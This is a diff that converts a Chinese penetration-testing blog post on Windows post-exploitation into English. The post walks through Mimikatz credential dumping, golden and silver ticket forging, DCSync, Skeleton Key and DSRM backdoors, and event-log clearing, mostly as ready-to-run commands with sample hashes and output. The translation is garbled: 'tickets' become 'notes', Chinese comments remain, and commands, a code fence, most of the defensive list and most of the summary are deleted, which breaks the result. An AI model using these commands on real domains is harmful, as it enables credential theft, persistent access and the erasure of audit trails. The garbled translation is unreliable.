@@ -1,42 +1,41 @@
 ---
-title: "Windows 后渗透 — Mimikatz 密码提取、黄金/白银票据攻击"
-url: windows-post-exploitation
+title: "Windows post-exploitation — Mimikatz password extraction, gold/silver note attacks"
+url: "en/windows-post-exploitation"
 date: "2026-01-20"
 draft: false
-summary: "Mimikatz凭据提取全模块实战，黄金票据与白银票据攻击完整流程，DCSync与持久化后门"
+summary: "Mimikatz credential extraction full module actual combat, complete process of gold note and silver note attack, DCSync and persistence backdoor"
 authors: ["default"]
 tags:
   - Windows
   - Mimikatz
   - Kerberos
-  - 票据攻击
+  - ticket attack
 images: ["https://images.unsplash.com/photo-1614064641913-6b0337d12f17?auto=format&fit=crop&w=1200&q=80"]
 categories:
-  - 渗透测试
+  - Penetration testing
 ---
 
+# Windows post-exploitation — Mimikatz password extraction, gold/silver ticket attacks
 
-# Windows 后渗透 — Mimikatz 密码提取、黄金/白银票据攻击
+The post-exploitation stage is the most valuable part of penetration testing. After gaining initial access and elevating privileges, the attacker needs to extract credentials, establish persistence, and penetrate deeper into the domain environment. Mimikatz is the most iconic tool in Windows post-exploitation, capable of extracting plaintext passwords, NTLM hashes, and Kerberos tickets from memory. This article will comprehensively explain the core functions of Mimikatz, as well as advanced domain attack technologies such as gold notes, silver notes, and DCSync.
 
-后渗透（Post-Exploitation）阶段是渗透测试中价值最高的环节。在获取初始访问和提升权限之后，攻击者需要提取凭据、建立持久化、深入域环境。Mimikatz 是 Windows 后渗透中最具代表性的工具，它能从内存中提取明文密码、NTLM Hash 和 Kerberos 票据。本文将全面讲解 Mimikatz 的核心功能，以及黄金票据、白银票据、DCSync 等高级域攻击技术。
+## Mimikatz introduction and functional modules
 
-## Mimikatz 简介与功能模块
+Developed by French security researcher Benjamin Delpy, Mimikatz is one of the most important tools in Windows security research. It extracts authentication credentials by directly accessing the Windows Security Subsystem (LSASS process).
 
-Mimikatz 由法国安全研究员 Benjamin Delpy 开发，是 Windows 安全研究领域最重要的工具之一。它通过直接访问 Windows 安全子系统（LSASS 进程）来提取认证凭据。
+### Core module overview
 
-### 核心模块概览
-
-| 模块 | 功能 | 典型用途 |
+| Module | Function | Typical uses |
 |------|------|---------|
-| sekurlsa | LSASS 进程凭据提取 | 提取密码、Hash、票据 |
-| lsadump | LSA 数据库操作 | SAM 数据库导出、DCSync |
-| kerberos | Kerberos 操作 | 票据导出/导入/伪造 |
-| crypto | 加密操作 | 证书导出 |
-| vault | Windows 凭据保管库 | 提取保存的凭据 |
-| dpapi | 数据保护 API | 解密 Chrome 密码等 |
-| token | 令牌操作 | 令牌提升和模拟 |
+| sekurlsa | LSASS process credential extraction | Extract passwords, hashes, tickets |
+| lsadump | LSA database operations | SAM database export, DCSync |
+| kerberos | Kerberos operations | ticket export/import/forgery |
+| crypto | cryptographic operations | certificate export |
+| vault | Windows Credential Vault | Extract saved credentials |
+| dpapi | Data Protection API | Decrypt Chrome passwords and more |
+| token | token operations | token promotion and impersonation |
 
-### 基本使用
+### Basic use
 
 ```cmd
 :: 运行 Mimikatz（需要管理员权限）
@@ -63,42 +62,42 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 
-:: 输出示例：
-:: Authentication Id : 0 ; 999 (00000000:000003e7)
-:: Session           : UndefinedLogonType from 0
-:: User Name         : DC01$
-:: Domain            : LAB
-:: Logon Server      : (null)
-:: SID               : S-1-5-18
-::   msv :
-::    [00000003] Primary
-::    * Username : DC01$
-::    * Domain   : LAB
-::    * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
-::   ...
+::Example output:
+::Authentication Id : 0 ; 999 (00000000:000003e7)
+::Session: UndefinedLogonType from 0
+:: User Name : DC01$
+:: Domain :LAB
+::Logon Server: (null)
+:: SID : S-1-5-18
+:: msv :
+:: [00000003] Primary
+:: * Username : DC01$
+:: * Domain : LAB
+:: * NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
+:: ...
 ::
-:: Authentication Id : 0 ; 453871 (00000000:0006ecef)
-:: Session           : Interactive from 1
-:: User Name         : Administrator
-:: Domain            : LAB
-:: Logon Server      : DC01
-::   msv :
-::    [00000003] Primary
-::    * Username : Administrator
-::    * Domain   : LAB
-::    * NTLM     : fc525c9683e8fe067095ba2ddc971889
-::    * SHA1     : e7cf9a4b8f5e30b0e0f9a6a29f06352c1a8b0e2d
-::   wdigest :
-::    * Username : Administrator
-::    * Domain   : LAB
-::    * Password : P@ssw0rd!
-::   kerberos :
-::    * Username : Administrator
-::    * Domain   : LAB.LOCAL
-::    * Password : P@ssw0rd!
+::Authentication Id : 0 ; 453871 (00000000:0006ecef)
+::Session : Interactive from 1
+::User Name :Administrator
+:: Domain :LAB
+:: Logon Server : DC01
+:: msv :
+:: [00000003] Primary
+:: * Username : Administrator
+:: * Domain : LAB
+:: * NTLM : fc525c9683e8fe067095ba2ddc971889
+:: * SHA1 : e7cf9a4b8f5e30b0e0f9a6a29f06352c1a8b0e2d
+::wdigest:
+:: * Username : Administrator
+:: * Domain : LAB
+:: * Password : P@ssw0rd!
+::kerberos:
+:: * Username : Administrator
+:: * Domain : LAB.LOCAL
+:: * Password : P@ssw0rd!
 ```
 
-> **注意**：Windows 10 / Server 2016 之后，默认禁用了 WDigest 明文密码缓存。可以通过修改注册表重新启用：
+> **NOTE**: After Windows 10/Server 2016, WDigest clear text password caching is disabled by default. It can be re-enabled by modifying the registry:
 
 ```cmd
 :: 启用 WDigest 明文密码存储（需要用户重新登录后生效）
@@ -114,24 +113,24 @@ rundll32.exe user32.dll,LockWorkStation
 :: 提取 NTLM Hash
 mimikatz # sekurlsa::msv
 
-:: 提取 Kerberos 票据
+::Extract Kerberos ticket
 mimikatz # sekurlsa::tickets /export
 
-:: 提取 WDigest 凭据
-mimikatz # sekurlsa::wdigest
+::Extract WDigest credentials
+mimikatz #sekurlsa::wdigest
 
-:: 提取 DPAPI 主密钥
-mimikatz # sekurlsa::dpapi
+::Extract DPAPI master key
+mimikatz #sekurlsa::dpapi
 
-:: 提取 ekeys（Kerberos 加密密钥）
-mimikatz # sekurlsa::ekeys
+::Extract ekeys (Kerberos encryption keys)
+mimikatz #sekurlsa::ekeys
 
-:: 从 LSASS 转储文件中提取（离线分析）
+:: Extracted from LSASS dump file (offline analysis)
 mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords
+mimikatz #sekurlsa::logonpasswords
 ```
 
-### 创建 LSASS 转储
+### Create LSASS dump
 
 ```cmd
 :: 方法一：使用任务管理器
@@ -160,31 +159,31 @@ mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::sam
 
-:: 输出示例：
-:: RID  : 000001f4 (500)
-:: User : Administrator
-::   Hash NTLM: fc525c9683e8fe067095ba2ddc971889
+::Example output:
+::RID: 000001f4 (500)
+::User :Administrator
+::Hash NTLM: fc525c9683e8fe067095ba2ddc971889
 ::
-:: RID  : 000001f5 (501)
-:: User : Guest
+::RID: 000001f5 (501)
+::User : Guest
 ::
-:: RID  : 000003e9 (1001)
-:: User : testuser
-::   Hash NTLM: a4f49c406510bdcab6824ee7c30fd852
+::RID: 000003e9 (1001)
+::User : testuser
+::Hash NTLM: a4f49c406510bdcab6824ee7c30fd852
 
-:: 离线提取（从备份的 SAM 和 SYSTEM 文件）
-:: 首先获取 SAM 和 SYSTEM 注册表文件
+::Offline extraction (from backed up SAM and SYSTEM files)
+:: First get the SAM and SYSTEM registry files
 reg save HKLM\SAM C:\Temp\sam
 reg save HKLM\SYSTEM C:\Temp\system
 
-:: 然后使用 Mimikatz 离线解析
+:: Then use Mimikatz to parse offline
 mimikatz # lsadump::sam /sam:C:\Temp\sam /system:C:\Temp\system
 
-:: 使用 impacket-secretsdump 离线解析（Linux 上）
+:: Offline parsing using impacket-secretsdump (on Linux)
 impacket-secretsdump -sam sam -system system LOCAL
 ```
 
-## NTLM Hash 提取与利用
+## NTLM Hash extraction and utilization
 
 ```bash
 # 使用 impacket-secretsdump 远程提取所有哈希
@@ -220,12 +219,12 @@ john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 :: 方法一：Mimikatz DCSync（需要域管或等效权限）
 mimikatz # lsadump::dcsync /user:krbtgt /domain:lab.local
 
-:: 输出：
-:: SAM Username         : krbtgt
-:: Hash NTLM            : b889e0d47d6fe22c8f0463a96f3e2d14
-:: Object Security ID   : S-1-5-21-1234567890-1234567890-1234567890-502
+::Output:
+:: SAM Username : krbtgt
+:: Hash NTLM : b889e0d47d6fe22c8f0463a96f3e2d14
+:: Object Security ID : S-1-5-21-1234567890-1234567890-1234567890-502
 
-:: 方法二：从 NTDS.dit 提取
+::Method 2: Extract from NTDS.dit
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
 
@@ -241,20 +240,20 @@ impacket-secretsdump lab.local/administrator:'P@ssw0rd!'@10.10.10.100 -just-dc-u
 :: 需要：域名、域 SID、krbtgt Hash、目标用户名
 mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /ptt
 
-:: 参数说明：
-:: /user       - 伪造的用户名（可以是不存在的用户）
-:: /domain     - 域名
-:: /sid        - 域 SID
-:: /krbtgt     - krbtgt 的 NTLM Hash
-:: /ptt        - Pass-the-Ticket，直接注入到当前会话
+:: Parameter description:
+:: /user - fake username (can be a non-existent user)
+::/domain - domain name
+::/sid - Domain SID
+::/krbtgt - NTLM Hash of krbtgt
+::/ptt - Pass-the-Ticket, injected directly into the current session
 
-:: 生成票据文件（不立即注入）
+:: Generate ticket file (not injected immediately)
 mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /ticket:golden.kirbi
 
-:: 稍后注入票据
+:: Inject tickets later
 mimikatz # kerberos::ptt golden.kirbi
 
-:: 设置票据有效期为 10 年
+::Set the ticket validity period to 10 years
 mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:b889e0d47d6fe22c8f0463a96f3e2d14 /endin:525600 /renewmax:525600 /ptt
 ```
 
@@ -274,18 +273,18 @@ impacket-wmiexec lab.local/Administrator@DC01.lab.local -k -no-pass
 :: 查看当前缓存的票据
 klist
 
-:: 测试访问域控 C 盘共享
+:: Test access to domain controller C drive share
 dir \\DC01\C$
 
-:: 在域控上执行命令
+:: Execute commands on the domain controller
 PsExec.exe \\DC01 cmd.exe
 ```
 
-## 白银票据（Silver Ticket）攻击
+## Silver Ticket Attack
 
-白银票据伪造的是服务票据（ST/TGS），而非 TGT。它只能访问特定服务，但优势在于不需要与 KDC 通信，更加隐蔽。
+Silver notes are counterfeit Service Notes (ST/TGS), not TGT. It can only access specific services, but the advantage is that it does not need to communicate with the KDC and is more invisible.
 
-### 白银票据制作
+### Silver bill production
 
 ```cmd
 :: 首先需要目标服务账户的 NTLM Hash
@@ -315,21 +314,21 @@ export KRB5CCNAME=Administrator.ccache
 impacket-smbclient lab.local/Administrator@SRV01.lab.local -k -no-pass
 ```
 
-### 黄金票据 vs 白银票据
+### Gold Notes vs Silver Notes
 
-| 特性 | 黄金票据 | 白银票据 |
+| Features | Gold Notes | Silver Notes |
 |------|---------|---------|
-| 伪造类型 | TGT | TGS/ST |
-| 所需 Hash | krbtgt | 目标服务账户 |
-| 访问范围 | 域内所有资源 | 仅目标服务 |
-| KDC 通信 | 需要 | 不需要 |
-| 隐蔽性 | 较低 | 较高 |
-| 有效期 | 默认 10 年 | 默认 30 天 |
-| 检测难度 | 中等 | 较难 |
+| Counterfeit Type | TGT | TGS/ST |
+| Required Hash | krbtgt | Target Service Account |
+| Access scope | All resources in the domain | Target service only |
+| KDC Communications | Required | Not Required |
+| Concealment | Lower | Higher |
+| Validity period | Default 10 years | Default 30 days |
+| Detection difficulty | Medium | Hard |
 
-## DCSync 攻击
+## DCSync attack
 
-DCSync 是一种通过模拟域控制器复制行为来提取域用户哈希的攻击技术。它利用 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All 权限，无需在域控制器上执行任何代码。
+DCSync is an attack technique that extracts domain user hashes by simulating domain controller replication behavior. It leverages the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions without executing any code on the domain controller.
 
 ```cmd
 :: Mimikatz DCSync — 提取特定用户
@@ -346,23 +345,17 @@ mimikatz # lsadump::dcsync /domain:lab.local /all /csv
 # impacket-secretsdump DCSync
 impacket-secretsdump lab.local/administrator:'P@ssw0rd!'@10.10.10.100
 
-# 仅提取域用户哈希
-impacket-secretsdump -just-dc lab.local/administrator:'P@ssw0rd!'@10.10.10.100
+# Extract only domain user hashes
 
-# 使用 Hash 进行 DCSync
-impacket-secretsdump -hashes :fc525c9683e8fe067095ba2ddc971889 lab.local/administrator@10.10.10.100
+# Using Hash for DCSync
 
-# 输出格式：
-# lab.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
-# lab.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a96f3e2d14:::
-# lab.local\testuser:1103:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::
-```
+# Output format:
 
-## 凭据持久化
+## Credential persistence
 
 ### Skeleton Key
 
-Skeleton Key 攻击在域控的 LSASS 进程中注入万能密码，使攻击者可以使用任意用户名 + 万能密码登录，同时不影响原密码的使用。
+The Skeleton Key attack injects a universal password into the LSASS process of the domain controller, allowing the attacker to log in using any username + universal password without affecting the use of the original password.
 
 ```cmd
 :: 在域控上注入 Skeleton Key（需要域管权限）
@@ -378,15 +371,13 @@ net use \\DC01\IPC$ /user:lab\Administrator mimikatz
 # 远程验证 Skeleton Key
 crackmapexec smb 10.10.10.100 -u Administrator -p 'mimikatz' -d lab.local
 
-# 使用万能密码通过 PsExec 获取 Shell
-impacket-psexec lab.local/Administrator:mimikatz@10.10.10.100
-```
+# Get Shell via PsExec using master password
 
-> **注意**：Skeleton Key 仅存在于内存中，域控重启后失效。
+> **Note**: Skeleton Key only exists in memory and will become invalid after the domain controller is restarted.
 
-### DSRM 后门
+### DSRM backdoor
 
-目录服务恢复模式（DSRM）账户的密码在域控安装时设定，之后很少更改。通过修改注册表可以使 DSRM 账户能够远程登录。
+The password for a Directory Services Recovery Model (DSRM) account is set during domain controller installation and is rarely changed thereafter. The DSRM account can be logged in remotely by modifying the registry.
 
 ```cmd
 :: 查看 DSRM 密码 Hash
@@ -404,7 +395,7 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t
 impacket-psexec -hashes :dsrm_ntlm_hash ./Administrator@10.10.10.100
 ```
 
-### AdminSDHolder 持久化
+### AdminSDHolder persistence
 
 ```powershell
 # AdminSDHolder 是一个特殊的 AD 容器，其 ACL 每 60 分钟会被复制到所有受保护的组
@@ -426,26 +417,26 @@ Invoke-ADSDPropagation
 mimikatz # kerberos::purge
 klist purge
 
-:: 清除事件日志（仅在授权范围内）
+:: Clear event log (only within authorization scope)
 wevtutil cl Security
 wevtutil cl System
 wevtutil cl Application
 
-:: PowerShell 清除日志
+:: PowerShell Clear Logs
 Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
 
-:: 清除 PowerShell 历史
+:: Clear PowerShell history
 Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
 
-:: 删除上传的工具
+:: Delete uploaded tools
 del /f /q C:\Temp\mimikatz.exe
 del /f /q C:\Temp\winPEASx64.exe
 
-:: 还原注册表修改
+::Revert registry modifications
 reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f
 
-:: 移除 Skeleton Key（重启域控或使用）
-:: 最可靠的方法是重启域控 LSASS 服务
+:: Remove Skeleton Key (restart domain control or use)
+:: The most reliable method is to restart the domain controller LSASS service
 ```
 
 ```bash
@@ -490,31 +481,17 @@ Install-Module -Name LAPS -Force
 # 将敏感账户加入 Protected Users 组
 Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","svc_admin"
 
-# Protected Users 组的账户将：
-# - 不使用 NTLM 认证
-# - 不缓存凭据
-# - 不使用 DES 或 RC4 加密
-# - TGT 有效期缩短为 4 小时
-```
+# Accounts in the Protected Users group will:
 
-### 其他防御措施
+### Other defensive measures
 
-- **启用 LSA 保护** — 防止非授权进程访问 LSASS
-- **部署 EDR** — 检测 Mimikatz 及类似工具的行为
-- **监控 DCSync** — 审计 DS-Replication 相关权限和事件（Event ID 4662）
-- **定期轮换 krbtgt 密码** — 双次重置使现有黄金票据失效
-- **网络分段** — 限制域控的网络访问范围
+- **Enable LSA Protection** — Prevent unauthorized processes from accessing LSASS
 
-## 总结
+## Summarize
 
-Windows 后渗透是渗透测试中技术含量最高的阶段。本文详细讲解了以 Mimikatz 为核心的凭据提取和高级域攻击技术：
+Windows post-penetration is the most technical phase of penetration testing. This article explains in detail the credential extraction and advanced domain attack technology with Mimikatz as the core:
 
-- **凭据提取** — `sekurlsa::logonpasswords` 和 `lsadump::sam` 是获取密码和 Hash 的核心命令
-- **黄金票据** — 通过 krbtgt Hash 伪造 TGT，实现域内任意资源的持久访问
-- **白银票据** — 伪造服务票据，针对特定服务进行隐蔽攻击
-- **DCSync** — 模拟域控复制提取所有域用户哈希，无需在 DC 上执行代码
-- **持久化** — Skeleton Key 和 DSRM 后门提供了域级别的持久访问
-- **防御体系** — Credential Guard、LAPS、Protected Users 构成多层防御
+- **Credential Extraction** — `sekurlsa::logonpasswords` and `lsadump::sam` are the core commands for getting passwords and hashes
 
-这些技术在合法的渗透测试和红队评估中具有重要价值。在实际操作中，务必确保拥有明确的授权，并严格控制测试范围。掌握攻击技术的最终目的是理解风险，从而更好地防御。
+These techniques are valuable in legitimate penetration testing and red team assessments. In practice, it is important to ensure that there is clear authorization and that the scope of testing is strictly controlled. The ultimate goal of mastering attack techniques is to understand risks and thereby better defend against them.
 
